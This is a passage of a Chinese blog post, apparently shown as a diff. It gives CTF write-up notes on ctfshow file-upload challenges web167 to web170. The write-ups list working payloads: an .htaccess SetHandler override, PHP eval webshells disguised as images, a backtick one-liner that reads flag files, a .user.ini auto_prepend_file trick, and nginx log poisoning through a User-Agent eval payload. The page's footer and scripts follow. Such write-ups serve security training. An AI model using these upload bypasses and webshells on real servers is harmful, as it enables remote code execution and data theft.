+<p>然而，在 Nginx 中，并没有一个直接等价于 .htaccess 的概念。Nginx 的配置主要通过它的主配置文件（通常是 &#x2F;etc&#x2F;nginx&#x2F;nginx.conf）以及其他可能包含的额外配置文件来完成。Nginx 鼓励进行集中式的配置管理，因此不支持像 .htaccess 这样分散的、目录级别的配置文件。这种设计选择有助于提高 Nginx 的性能，因为它避免了对每个请求进行文件系统级的配置查找，这在 Apache 中可能会导致性能下降。</p>
+</blockquote>
+<p>编辑<code>.htaccess</code>文件，内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;.htaccess&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">Sethandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
+
+<p><code>Sethandler application/x-httpd-php</code>是把所有目录下的文件当php文件处理。</p>
+<p>再上传一个含马的图片即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;maa.jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h2><p>提示：基础免杀。</p>
+<p>首先查看网页源码，发现可以上传png文件。上传一个空的png文件，成功上传；然后，直接写马，<code>&lt;?=eval($_POST[&#39;cmd&#39;]);?&gt;</code>，发现返回“null”。疑似内容审查。通过fuzz发现<code>eval</code>和<code>$_POST</code>、<code>$_GET</code>都不能出现在文件内容里。所以使用短马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.png&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?=`cat ../f*`;?&gt;</span><br></pre></td></tr></table></figure>
+<p>上传成功。</p>
+<p>但是，直接访问<code>upload/1.png</code>是不会有东西出来的，因为其没有被当作php运行。</p>
+<p>改包，直接改后缀名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?=`cat ../f*`;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>upload/1.php</code>，成功。</p>
+<h2 id="web169"><a href="#web169" class="headerlink" title="web169"></a>web169</h2><p>前端限制zip上传，尝试传一个空zip文件上去，却失败了，抓了个包，试出了后端的<code>Content-Type</code>必须要是<code>image/png</code>。</p>
+<p>就算内容是这样也能传上去：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;0.php&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line"></span><br><span class="line">&lt;?=;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后发现反引号也被防出去了，system啥的也被屏蔽了。问号也被屏蔽了。</p>
+<p>百思不得其解，<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_48780534/article/details/126723967">wp</a>原来还要回到<code>.user.ini</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;.user.ini&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p>然后访问<code>upload/index.php</code>，404了。所以再上传一个<code>index.php</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;index.php&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">123</span><br></pre></td></tr></table></figure>
+
+<p>再访问<code>upload/index.php</code>就成功返回日志了。</p>
+<p>再重新进行日志注入就可以了，修改User-Agent。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /upload/index.php?cmd=system(&#x27;ls&#x27;); HTTP/1.1</span><br><span class="line">Host: 1ca84b20-20a9-42aa-8f8f-cbbb8026cfda.challenge.ctf.show</span><br><span class="line">User-Agent: &lt;?=@eval($_GET[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+
+<p>然后nl flag。注意：get参数里的空格要URL编码，不然会400 bad request。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /upload/index.php?cmd=system(&#x27;nl%20../flagaa.php&#x27;); HTTP/1.1</span><br><span class="line">Host: 1ca84b20-20a9-42aa-8f8f-cbbb8026cfda.challenge.ctf.show</span><br><span class="line">User-Agent: &lt;?=@eval($_GET[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+
+<h2 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h2><p>前端限制仅zip可上传。后端还是限制<code>Content-Type: image/png</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;p.php&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
+
+<p>尝试上一题的解法，在上传含有<code>auto_prepend_file=/var/log/nginx/access.log</code>的<code>.user.ini</code>文件和任意内容的<code>index.php</code>文件后，访问<code>upload/index.php</code>，成功文件包含。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /upload/index.php?cmd=system(&#x27;nl%20../flagaa.php&#x27;); HTTP/1.1</span><br><span class="line">Host: f60687ec-1b08-4b82-81c5-f3db1f86f35e.challenge.ctf.show</span><br><span class="line">User-Agent: &lt;?=eval($_GET[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+
+<p>最后日志注入，成功得到flag。</p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87"><span class="toc-number">1.</span> <span class="toc-text">文件上传篇</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web151"><span class="toc-number">1.1.</span> <span class="toc-text">web151</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web152"><span class="toc-number">1.2.</span> <span class="toc-text">web152</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web153"><span class="toc-number">1.3.</span> <span class="toc-text">web153</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web154"><span class="toc-number">1.4.</span> <span class="toc-text">web154</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web155"><span class="toc-number">1.5.</span> <span class="toc-text">web155</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web156"><span class="toc-number">1.6.</span> <span class="toc-text">web156</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web157"><span class="toc-number">1.7.</span> <span class="toc-text">web157</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web158"><span class="toc-number">1.8.</span> <span class="toc-text">web158</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web159"><span class="toc-number">1.9.</span> <span class="toc-text">web159</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web160"><span class="toc-number">1.10.</span> <span class="toc-text">web160</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web161"><span class="toc-number">1.11.</span> <span class="toc-text">web161</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web162"><span class="toc-number">1.12.</span> <span class="toc-text">web162</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web163"><span class="toc-number">1.13.</span> <span class="toc-text">web163</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IP%E8%BD%AC%E5%8D%81%E8%BF%9B%E5%88%B6%E5%92%8C%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.13.1.</span> <span class="toc-text">IP转十进制和远程文件包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web164"><span class="toc-number">1.14.</span> <span class="toc-text">web164</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E9%A9%AC%E7%94%9F%E6%88%90"><span class="toc-number">1.14.1.</span> <span class="toc-text">图片马生成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9AGITHUB%E7%9A%84Python%E8%84%9A%E6%9C%AC"><span class="toc-number">1.14.2.</span> <span class="toc-text">方法1：GITHUB的Python脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9APHP%E8%84%9A%E6%9C%AC"><span class="toc-number">1.14.3.</span> <span class="toc-text">方法2：PHP脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web165"><span class="toc-number">1.15.</span> <span class="toc-text">web165</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web166"><span class="toc-number">1.16.</span> <span class="toc-text">web166</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web167"><span class="toc-number">1.17.</span> <span class="toc-text">web167</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#httpd%E3%80%81%E4%B8%AD%E9%97%B4%E4%BB%B6"><span class="toc-number">1.17.1.</span> <span class="toc-text">httpd、中间件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-HTTP-Server-%E5%92%8C-Nginx"><span class="toc-number">1.17.2.</span> <span class="toc-text">Apache HTTP Server 和 Nginx</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web168"><span class="toc-number">1.18.</span> <span class="toc-text">web168</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web169"><span class="toc-number">1.19.</span> <span class="toc-text">web169</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web170"><span class="toc-number">1.20.</span> <span class="toc-text">web170</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&text=ctfshow-web入门笔记-文件上传"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&title=ctfshow-web入门笔记-文件上传"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&is_video=false&description=ctfshow-web入门笔记-文件上传"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow-web入门笔记-文件上传&body=Check out this article: http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&title=ctfshow-web入门笔记-文件上传"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&title=ctfshow-web入门笔记-文件上传"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&title=ctfshow-web入门笔记-文件上传"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&title=ctfshow-web入门笔记-文件上传"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&name=ctfshow-web入门笔记-文件上传&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&t=ctfshow-web入门笔记-文件上传"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    ShuiChang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'ShuiChang2019/Utterance_comments_try';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
